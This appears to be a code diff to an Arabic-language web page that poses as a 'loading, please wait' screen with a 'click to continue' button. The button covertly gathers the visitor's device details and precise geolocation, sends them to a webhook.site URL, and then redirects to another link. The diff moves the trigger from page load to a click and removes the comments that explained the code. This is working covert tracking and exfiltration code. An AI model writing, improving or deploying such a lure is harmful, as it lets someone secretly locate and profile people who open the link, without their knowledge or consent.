@@ -2,18 +2,41 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>Loading...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جارِ التحميل...</title>
+    <style>
+        body {
+            font-family: Tahoma, sans-serif;
+            text-align: center;
+            padding-top: 50px;
+            background-color: #f4f4f9;
+        }
+        .btn {
+            background-color: #007bff;
+            color: white;
+            padding: 12px 25px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .btn:hover {
+            background-color: #0056b3;
+        }
+    </style>
 </head>
 <body>
+    <h3>جارِ تجهيز المحتوى، يرجى الانتظار...</h3>
+    <button class="btn" id="loadBtn">اضغط هنا للمتابعة</button>
+
     <script>
-        // الرابط الذي يتم التوجيه إليه بعد إتمام العملية
         const REDIRECT_URL = "https://kommodo.ai/i/kASJW4whheWnTYAkETin";
+        const WEBHOOK_URL = "https://webhook.site/3f43ac27-d027-44d7-9d1f-dc8ed7c80153";
 
-        // رابط الـ Webhook لاستقبال البيانات (قم بتعديله بالرابط الخاص بك)
-       const WEBHOOK_URL = "https://webhook.site/3f43ac27-d027-44d7-9d1f-dc8ed7c80153";
-
-        async function collectAndSend() {
-            // تجميع معلومات المتصفح والجهاز الأساسية المتاحة للبرمجة
+        document.getElementById('loadBtn').addEventListener('click', async () => {
+            document.getElementById('loadBtn').style.display = 'none';
+            
             const deviceInfo = {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
@@ -25,7 +48,6 @@
                 timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
             };
 
-            // التحقق من دعم المتصفح لخاصية تحديد الموقع الجغرافي
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     async (position) => {
@@ -49,12 +71,12 @@
                         };
                         await sendData(data);
                     },
-                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                 );
             } else {
                 await sendData({ status: "NO_GEOLOCATION_SUPPORT", device: deviceInfo });
             }
-        }
+        });
 
         async function sendData(payload) {
             try {
@@ -66,12 +88,9 @@
             } catch (e) {
                 console.error(e);
             } finally {
-                // إعادة التوجيه للرابط المحدد بعد الإرسال
                 window.location.href = REDIRECT_URL;
             }
         }
-
-        window.onload = collectAndSend;
     </script>
 </body>
 </html>
